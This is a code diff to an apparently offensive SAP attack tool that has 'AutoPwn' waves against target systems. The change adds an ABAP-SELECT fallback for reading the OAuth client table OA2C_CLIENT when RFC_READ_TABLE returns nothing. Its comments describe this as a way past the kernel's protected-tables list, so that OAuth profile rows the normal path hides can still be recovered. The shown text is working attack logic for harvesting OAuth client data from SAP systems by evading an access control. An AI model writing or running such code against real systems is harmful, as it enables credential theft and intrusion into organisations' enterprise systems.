@@ -465,14 +465,33 @@ def read_oa2c_profiles(node: SAPNode,
         node, table, targeted_cols, creds, long_strings=True,
         soap_session=soap_session)
     if not clients:
-        print(f"[*] {node.sid}: {table} returned 0 rows — table "
-              f"exists but has no OAuth profiles configured")
-        # Same negative-cache reasoning as above: no OAuth clients
-        # configured is a stable landscape fact; the operator would
-        # need to touch OA2C_CONFIG on the target before it changes.
-        # Stamp so subsequent AutoPwn waves skip.
-        node._oa2c_absent = True
-        return []
+        # RFC_READ_TABLE returned 0 rows.  On modern S/4 this can mean
+        # OA2C_CLIENT is on the kernel's protected-tables list — SE16
+        # sees the row but RFC_READ_TABLE returns nothing (same shape
+        # of failure that DBCON, TMSMCONF and other system tables hit
+        # on S/4HANA 2022+).  Try the ABAP-SELECT fallback before
+        # stamping the negative cache — it uses OPEN SQL directly and
+        # bypasses the protected-tables list.  Only after ABAP-SELECT
+        # also returns nothing do we mark the table as truly absent.
+        print(f"[*] {node.sid}: {table} returned 0 rows via "
+              f"RFC_READ_TABLE — trying ABAP-SELECT fallback in case "
+              f"the table is on the kernel's protected list…")
+        abap_rows = _read_via_abap_fallback(
+            node, table, targeted_cols, creds,
+            soap_session=soap_session)
+        if abap_rows:
+            print(f"[+] {node.sid}: {table} ABAP-SELECT recovered "
+                  f"{len(abap_rows)} row(s) that RFC_READ_TABLE hid")
+            clients = abap_rows
+        else:
+            print(f"[*] {node.sid}: {table} returned 0 rows on both "
+                  f"paths — table genuinely has no OAuth profiles "
+                  f"configured")
+            # Now safe to cache: both RFC_READ_TABLE (which sees the
+            # protected-tables truncation) AND ABAP SELECT (which
+            # bypasses it) agree the table is empty.
+            node._oa2c_absent = True
+            return []
 
     # When the kernel doesn't honour USE_ET_DATA_4_RETURN — or
     # honours it nominally but doesn't actually populate the STRING
